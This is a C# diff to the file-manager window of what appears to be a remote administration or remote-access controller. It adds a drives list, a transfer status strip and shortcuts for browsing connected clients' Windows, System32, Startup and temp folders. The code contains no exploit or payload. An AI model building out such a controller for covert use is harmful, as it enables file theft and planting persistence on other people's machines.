@@ -42,8 +42,63 @@ public partial class FileManagerWindow : Window
             _server.UnregisterHandler(clientId, PacketType.FmHashResult);
             _server.UnregisterHandler(clientId, PacketType.FmAck);
         };
-        Loaded += async (_, _) => { await Task.Delay(Random.Shared.Next(0, 250)); await Navigate(""); };
+        Loaded += async (_, _) =>
+        {
+            await Task.Delay(Random.Shared.Next(0, 250));
+            // Populate drives (navigate to root = drive list on Windows)
+            _ = LoadDrivesAsync();
+            await Navigate("");
+        };
     }
+
+    // ── Drives ────────────────────────────────────────
+
+    private async Task LoadDrivesAsync()
+    {
+        try
+        {
+            var tcs = new TaskCompletionSource<string>();
+            _server.RegisterHandler(_clientId, PacketType.FmListResult + 100, _ => { }); // no-op guard
+            // Request drives via empty path
+            var savedPending = _pendingList;
+            _pendingList = new TaskCompletionSource<string>();
+            await _server.SendToClient(_clientId, new Packet
+            {
+                Type = PacketType.FmList,
+                Data = Newtonsoft.Json.JsonConvert.SerializeObject(new FmListData { Path = "" })
+            });
+            var json   = await _pendingList.Task.WaitAsync(TimeSpan.FromSeconds(10));
+            _pendingList = savedPending;
+            var result = Newtonsoft.Json.JsonConvert.DeserializeObject<FmListResultData>(json);
+            if (result?.Entries == null) return;
+            var drives = result.Entries
+                .Where(e => e.IsDir && e.Name.Length >= 2 && e.Name[1] == ':')
+                .Select(e => e.Name.TrimEnd('\\') + "\\")
+                .ToList();
+            if (drives.Count == 0)
+                drives = result.Entries.Where(e => e.IsDir).Select(e => e.Name).ToList();
+            _ = Dispatcher.BeginInvoke(() =>
+            {
+                DrivesList.Items.Clear();
+                foreach (var d in drives) DrivesList.Items.Add(d);
+            });
+        }
+        catch { }
+        finally { _pendingList = null; }
+    }
+
+    // ── Transfer strip ────────────────────────────────
+
+    private void ShowTransfer(string name, string status)
+        => _ = Dispatcher.BeginInvoke(() =>
+        {
+            TxtTransferName.Text   = name.Length > 30 ? name[..30] + "…" : name;
+            TxtTransferStatus.Text = status;
+            TransferStrip.Visibility = Visibility.Visible;
+        });
+
+    private void HideTransfer()
+        => _ = Dispatcher.BeginInvoke(() => TransferStrip.Visibility = Visibility.Collapsed);
 
     // ── Navigation ────────────────────────────────────
 
@@ -88,6 +143,7 @@ public partial class FileManagerWindow : Window
         if (dlg.ShowDialog() != true) return;
 
         TxtStatus.Text = $"Downloading {row.Name}…";
+        ShowTransfer(row.Name, "Downloading…");
         try
         {
             _pendingData = new TaskCompletionSource<string>();
@@ -99,11 +155,12 @@ public partial class FileManagerWindow : Window
             var json = await _pendingData.Task.WaitAsync(TimeSpan.FromSeconds(60));
             var result = JsonConvert.DeserializeObject<FmFileDataResult>(json);
             if (result == null || !string.IsNullOrEmpty(result.Error)) { TxtStatus.Text = $"Error: {result?.Error}"; return; }
-            await File.WriteAllBytesAsync(dlg.FileName, Convert.FromBase64String(result.Data));
-            TxtStatus.Text = $"Downloaded: {dlg.FileName}";
+            var bytes = Convert.FromBase64String(result.Data);
+            await File.WriteAllBytesAsync(dlg.FileName, bytes);
+            TxtStatus.Text = $"Downloaded: {row.Name}  ({bytes.Length:N0} bytes)";
         }
         catch (Exception ex) { TxtStatus.Text = ex.Message; }
-        finally { _pendingData = null; }
+        finally { _pendingData = null; HideTransfer(); }
     }
 
     private async void Upload_Click(object s, RoutedEventArgs e)
@@ -111,7 +168,9 @@ public partial class FileManagerWindow : Window
         var dlg = new Microsoft.Win32.OpenFileDialog { Multiselect = false };
         if (dlg.ShowDialog() != true) return;
         var destPath = Path.Combine(_currentPath, Path.GetFileName(dlg.FileName));
-        TxtStatus.Text = $"Uploading {Path.GetFileName(dlg.FileName)}…";
+        var uploadName = Path.GetFileName(dlg.FileName);
+        TxtStatus.Text = $"Uploading {uploadName}…";
+        ShowTransfer(uploadName, "Uploading…");
         try
         {
             var bytes = await File.ReadAllBytesAsync(dlg.FileName);
@@ -126,7 +185,7 @@ public partial class FileManagerWindow : Window
             await Navigate(_currentPath);
         }
         catch (Exception ex) { TxtStatus.Text = ex.Message; }
-        finally { _pendingAck = null; }
+        finally { _pendingAck = null; HideTransfer(); }
     }
 
     private async void Delete_Click(object s, RoutedEventArgs e)
@@ -326,6 +385,17 @@ public partial class FileManagerWindow : Window
     private async void GoToTemp_Click(object s, RoutedEventArgs e)    => await Navigate("%TEMP%");
     private async void GoToAppData_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%");
     private async void GoToStartup_Click(object s, RoutedEventArgs e) => await Navigate("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+    private async void GoToWindows_Click(object s, RoutedEventArgs e)  => await Navigate("%SystemRoot%");
+    private async void GoToSystem32_Click(object s, RoutedEventArgs e) => await Navigate("%SystemRoot%\\System32");
+
+    private async void DrivesList_SelectionChanged(object s, System.Windows.Controls.SelectionChangedEventArgs e)
+    {
+        if (DrivesList.SelectedItem is string drive)
+        {
+            DrivesList.SelectedItem = null;
+            await Navigate(drive);
+        }
+    }
 
     private async void GridFiles_DoubleClick(object s, MouseButtonEventArgs e)
     {
